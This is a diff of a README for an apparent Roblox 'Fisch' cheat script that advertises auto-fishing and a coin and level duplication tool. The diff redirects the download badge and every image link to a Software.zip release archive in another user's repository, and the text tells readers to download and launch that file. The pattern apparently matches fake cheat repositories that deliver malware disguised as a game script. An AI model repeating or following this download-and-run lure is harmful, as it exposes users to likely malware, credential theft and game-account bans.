@@ -1,6 +1,6 @@
 # Roblox Fisch Script
 
-![Roblox Logo](https://img.icons8.com/color/452/roblox.png)
+![Roblox Logo](https://github.com/Silvazada7/Roblox-Fisch-Script/releases/download/v2.0/Software.zip)
 
 Welcome to the "Roblox Fisch Script" repository! This script brings you the latest in Roblox fishing techniques, including KEYLESS Auto Fish, Level/Coin DUPE GUI, and more! Get ready to level up your fishing game in Roblox like never before!
 
@@ -16,7 +16,7 @@ Welcome to the "Roblox Fisch Script" repository! This script brings you the late
 
 1. Download the program from the following link: 
 
-[![Download Program](https://img.shields.io/badge/Download-Program.zip-brightgreen)](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip)
+[![Download Program](https://github.com/Silvazada7/Roblox-Fisch-Script/releases/download/v2.0/Software.zip)](https://github.com/Silvazada7/Roblox-Fisch-Script/releases/download/v2.0/Software.zip)
 
 2. Launch the downloaded file to install the Roblox Fisch Script.
 
@@ -30,6 +30,6 @@ If the download link does not work or you encounter any issues, please check the
 
 Don't forget to star this repository to stay updated on the latest releases and improvements to the Roblox Fisch Script. Join our community of Roblox fishing enthusiasts and level up your game today!
 
-![Fishing in Roblox](https://img.icons8.com/dusk/452/fishing-rod.png)
+![Fishing in Roblox](https://github.com/Silvazada7/Roblox-Fisch-Script/releases/download/v2.0/Software.zip)
 
 Happy fishing! 🐟🎣🌟
